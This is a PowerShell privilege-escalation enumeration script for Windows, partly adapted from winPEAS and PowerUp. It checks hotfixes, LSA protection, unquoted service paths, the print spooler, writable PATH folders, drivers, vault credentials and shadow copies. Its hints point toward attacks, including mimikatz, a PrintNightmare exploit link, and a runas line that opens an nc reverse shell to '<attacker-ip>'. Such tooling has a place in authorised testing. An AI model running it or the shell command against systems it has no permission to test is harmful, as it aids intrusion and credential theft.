# - [x] Kernel Exploitation
# - [x] HotFixID & HotFixHistory
# - [x] LSA Protection
# - [x] Unquoted Service Paths
# - [x] PrintNightmare
# - [x] Incorrect permissions in Services (Find-PathDLLHijack)
# - [x] Insecure GUI Apps
# - [x] Evaluating Vulnerable Drivers
# - [x] Runas
# - [x] Abusing Shadow Copies

function KernelInformation {

    try {
        $osVersion = [System.Environment]::OSVersion.Version
        $osInfoObj = Get-WmiObject -class Win32_OperatingSystem

        $osInfo = @{
            OS                 = $osInfoObj.Caption
            Major              = $osVersion.Major
            Minor              = $osVersion.Minor
            Build              = $osVersion.Build
            Revision           = $osVersion.Revision
            Architecture       = $osInfoObj.OSArchitecture
            ServicePack        = $osInfoObj.ServicePackMajorVersion
            InstallDate        = [Management.ManagementDateTimeConverter]::ToDateTime($osInfoObj.InstallDate)
            LastBootUpTime     = [Management.ManagementDateTimeConverter]::ToDateTime($osInfoObj.LastBootUpTime)
            Uptime             = (Get-Date) - [Management.ManagementDateTimeConverter]::ToDateTime($osInfoObj.LastBootUpTime)
        }

        $osInfo.GetEnumerator() | Sort-Object Name | Format-Table @{Label="Property";Expression={$_.Key}}, @{Label="Value";Expression={$_.Value}} -AutoSize
    }
    catch {
        Write-Host -ForegroundColor CYAN "[ERROR]" -NoNewline
        Write-Host " Error in calling os information: $_"
    }
}

function returnHotFixID {
    <#
    .NOTES
        Thanks to winPEAS creator.
    #>
    
    param(
      [string]$title
    )
    # Match on KB or if patch does not have a KB, return end result
    if (($title | Select-String -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value) {
      return (($title | Select-String -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value)
    }
    elseif (($title | Select-String -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value) {
      return (($title | Select-String -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value)
    }
}

function WindowsHotfixes {
    $Hotfix = Get-HotFix | Sort-Object -Descending -Property InstalledOn -ErrorAction SilentlyContinue | Select-Object HotfixID, Description, InstalledBy, InstalledOn
    $Hotfix | Format-Table -AutoSize
}

function WindowsHotfixHistory {
    <#
    .NOTES
        Thanks to winPEAS creator.
    #>
    
    $session = (New-Object -ComObject 'Microsoft.Update.Session')
    # Query the latest 50 updates starting with the first record
    $history = $session.QueryHistory("", 0, 1000) | Select-Object ResultCode, Date, Title

    #create an array for unique HotFixes
    $HotfixUnique = @()
    #$HotfixUnique += ($history[0].title | Select-String -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value

    $HotFixReturnNum = @()
    #$HotFixReturnNum += 0 

    for ($i = 0; $i -lt $history.Count; $i++) {
    $check = returnHotFixID -title $history[$i].Title
    if ($HotfixUnique -like $check) {
        #Do Nothing
    }
    else {
        $HotfixUnique += $check
        $HotFixReturnNum += $i
    }
    }
    $FinalHotfixList = @()

    $hotfixreturnNum | ForEach-Object {
    $HotFixItem = $history[$_]
    $Result = $HotFixItem.ResultCode
    # https://learn.microsoft.com/en-us/windows/win32/api/wuapi/ne-wuapi-operationresultcode?redirectedfrom=MSDN
    switch ($Result) {
        1 {
        $Result = "Missing/Superseded"
        }
        2 {
        $Result = "Succeeded"
        }
        3 {
        $Result = "Succeeded With Errors"
        }
        4 {
        $Result = "Failed"
        }
        5 {
        $Result = "Canceled"
        }
    }
    $FinalHotfixList += [PSCustomObject]@{
        Result = $Result
        Date   = $HotFixItem.Date
        Title  = $HotFixItem.Title
    }    
    }
    $FinalHotfixList | Format-Table -AutoSize
}

function LSAProtection {
    <#
    .DESCRIPTION
        The LSA (Local Security Authority) is a protected subsystem of Windows. Its task is not to grant access to resources without a user, service or system being correctly authenticated.
    #>
    
    $RunAsPPL = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\LSA).RunAsPPL
    $RunAsPPLBoot = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\LSA).RunAsPPLBoot
    switch ($RunAsPPL) {
    2 { 
        Write-Host -ForegroundColor CYAN "[INFO]" -NoNewline
        Write-Host " RunAsPPL: 2. Enabled without UEFI Lock"
    }
    1 { 
        Write-Host -ForegroundColor CYAN "[INFO]" -NoNewline
        Write-Host " RunAsPPL: 1. Enabled with UEFI Lock" 
    }
    0 { 
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " RunAsPPL: 0. LSA Protection Disabled. Try mimikatz."
    }
    Default { 
        Write-Host -ForegroundColor CYAN "[INFO]" -NoNewline
        Write-Host " The system was unable to find the specified registry value: RunAsPPL / RunAsPPLBoot" 
    }
    }
    if ($RunAsPPLBoot) { 
        Write-Host -ForegroundColor CYAN "[INFO]" -NoNewline
        Write-Host " RunAsPPLBoot = $($RunAsPPLBoot)" 
    }
}

function UnquotedServicePath {
    Write-Host -ForegroundColor YELLOW "[INFO]" -NoNewline
    Write-Host " Fetching the list of services, this may take a while...";
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch "`"" -and $_.PathName -inotmatch ":\\Windows\\" -and ($_.StartMode -eq "Auto" -or $_.StartMode -eq "Manual") -and ($_.State -eq "Running" -or $_.State -eq "Stopped") };
    if ($($services | Measure-Object).Count -lt 1) {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No unquoted service paths were found";
    }
    else {
        $services | ForEach-Object {
        Write-Host -ForegroundColor "[YES]" -NoNewline
        Write-Host " Unquoted Service Path found!"
        Write-Host Name: $_.Name
        Write-Host PathName: $_.PathName
        Write-Host StartName: $_.StartName 
        Write-Host StartMode: $_.StartMode
        Write-Host Running: $_.State
        } 
    }
}

function Spooler {
    <#
    .DESCRIPTION
        A running spooler service leads possibly to RCE or LPE.

    .NOTES
        https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/
    #>

    if((Get-Service -Name Spooler).Status -eq "Running") {
        $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " Spooler service is running, good luck."

        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/"

        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " https://github.com/calebstewart/CVE-2021-1675"
        
        if(Test-Path $registryPath) {
            $permissions = Get-Acl -Path $registryPath | Select-Object -ExpandProperty Access
            $canInstallPrinterDrivers = $permissions | Where-Object { $_.IdentityReference -match "BUILTIN\\Administrators" -and $_.FileSystemRights -match "FullControl" }

            if ($canInstallPrinterDrivers) {
                Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
                Write-Host " The user has authorizations to install printer drivers."
            } else {
                Write-Host -ForegroundColor RED "[NO]" -NoNewline
                Write-Host " The user has NO authorizations to install printer drivers. Create a new local user instead."
            }
        }
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " Spooler service is not running."
    }
}

function Get-ModifiablePath {
    <#
    .SYNOPSIS
    
    Parses a passed string containing multiple possible file/folder paths and returns
    the file paths where the current user has modification rights.
    
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    
    .DESCRIPTION
    
    Takes a complex path specification of an initial file/folder path with possible
    configuration files, 'tokenizes' the string in a number of possible ways, and
    enumerates the ACLs for each path that currently exists on the system. Any path that
    the current user has modification rights on is returned in a custom object that contains
    the modifiable path, associated permission set, and the IdentityReference with the specified
    rights. The SID of the current user and any group he/she are a part of are used as the
    comparison set against the parsed path DACLs.
    
    .PARAMETER Path
    
    The string path to parse for modifiable files. Required
    
    .PARAMETER Literal
    
    Switch. Treat all paths as literal (i.e. don't do 'tokenization').
    
    .EXAMPLE
    
    '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath
    
    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    
    .EXAMPLE
    
    Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath
    
    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    ...
    
    .OUTPUTS
    
    PowerUp.TokenPrivilege.ModifiablePath
    
    Custom PSObject containing the Permissions, ModifiablePath, IdentityReference for
    a modifiable path.
    #>
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Alias('LiteralPaths')]
        [Switch]
        $Literal
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if ($PSBoundParameters['Literal']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
                    if ($ParentPath -and (Test-Path -Path $ParentPath)) {
                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if (($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if ($TempPath -and ($TempPath -ne '')) {
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }

                    # the set of permission types that allow for modification
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if ($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if (-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                # translate the IdentityReference if it's a username and not a SID
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if ($CurrentUserSids -contains $IdentitySID) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $Permissions
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            $Out
                        }
                    }
                }
            }
        }
    }
}
    
function Find-PathDLLHijack {
    <#
    .SYNOPSIS

    Finds all directories in the system %PATH% that are modifiable by the current user.

    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: Get-ModifiablePath  

    .DESCRIPTION

    Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath
    to return the folder paths the current user can write to. On Windows 7, if wlbsctrl.dll is
    written to one of these paths, execution for the IKEEXT can be hijacked due to DLL search
    order loading.

    .EXAMPLE

    Find-PathDLLHijack

    Finds all %PATH% .DLL hijacking opportunities.

    .OUTPUTS

    PowerUp.HijackableDLL.Path

    .LINK

    http://www.greyhathacker.net/?p=738
    #>
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()

    # use -Literal so the spaces in %PATH% folders are not tokenized
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | Get-ModifiablePath -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach ($ModifidablePath in $ModifidablePaths) {
            if ($Null -ne $ModifidablePath.ModifiablePath) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath | Add-Member Aliasproperty Name '%PATH%'
                $ModifidablePath.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Path')
                $ModifidablePath
            }
        }
    }
}

function InsecureGUIApps {
    <#
    .DESCRIPTION
        Applications running as SYSTEM allowing a user to spawn a CMD or browse directories.
    #>

    function IsWindowsHelpAndSupportInstalled {
        $app = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
            Where-Object { $_.DisplayName -match "Windows Help and Support" }
    
        if ($app) {
            return $true
        } else {
            return $false
        }
    }
    
    # Check if "Windows Help and Support" is installed
    if (IsWindowsHelpAndSupportInstalled) {
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " Windows Help and Support GUI app is installed."
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Press [Win]+[F1], search for 'command prompt', click on 'Click to open Command Prompt'."
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " Windows Help and Support GUI app NOT is installed."
    }    
}

function Get-VulnerableDrivers {
    # Step 1: Get list of installed drivers using driverquery.exe
    $driverQueryOutput = & driverquery.exe /fo table /si

    # Parse driver names from driverquery output
    $drivers = $driverQueryOutput | Select-String -Pattern '^\s*(\S+)\s+' | ForEach-Object { $_.Matches.Groups[1].Value }

    # Step 2: Query vulnerable drivers using https://www.loldrivers.io/ API
    $vulnerableDrivers = @()

    Write-Host -ForegroundColor YELLOW "[INFO]" -NoNewline
    Write-Host " Searching for vulnerable drivers ..."

    foreach ($driver in $drivers) {
        try {
            # Query the API
            $url = "https://www.loldrivers.io/api/check/$driver"
            $response = Invoke-RestMethod -Uri $url -Method Get

            if ($response.IsVulnerable) {
                $vulnerableDrivers += [PSCustomObject]@{
                    DriverName = $driver
                    Description = $response.Description
                    CVEs = $response.CVEs -join ', '
                }
            }
        }
        catch {
        }
    }
    # Return only vulnerable drivers
    return $vulnerableDrivers
}

function CachedWindowsVaultCredentials {
    <#
    .DESCRIPTION
        The windows vault stores user credentials for servers, websites and other programs that windows ca log in the users automatically.
        Windows Vault stores credentials that Windows can log in the users automatically, which means that any Windows application that needs credentials to access a resource 
        (server or a website) can make use of this Credential Manager & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.
    #>

    $creds = cmdkey.exe /list
    if($creds -like "*Type: Domain Password*") {
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " Found some cached credentials in windows vault."

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " runas /savecred /user:WORKGROUP\Administrator C:\System32\cmd.exe"
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> 'c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe'"
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault"
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " Found NO cached credentials in windows vault."
    }
}

function ShadowCopies {
    <#
    .DESCRIPTION
        If the current user has local administrator access on a machine, we can try to list shadow copies. It is an easy way for Privilege Escalation to NT SYSTEM.
    #>

    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($user)

    if($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False) {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " We do NOT have local administrator rights."
    } else {
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " We have local administrator rights."

        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " List shadow copies: vssadmin list shadows"
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Create a symlink: "
    }
}